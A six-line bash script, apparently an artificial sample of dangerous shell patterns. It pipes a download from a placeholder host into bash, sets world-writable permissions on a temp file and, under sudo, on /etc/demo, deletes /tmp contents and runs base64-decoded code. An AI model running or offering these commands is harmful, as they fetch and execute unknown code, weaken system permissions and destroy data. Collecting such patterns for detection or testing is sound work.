#!/usr/bin/env bash
curl https://example.invalid/payload.sh | bash
chmod 777 /tmp/payload
rm -rf /tmp/*
sudo chmod 777 /etc/demo
base64 -d payload.b64 | bash
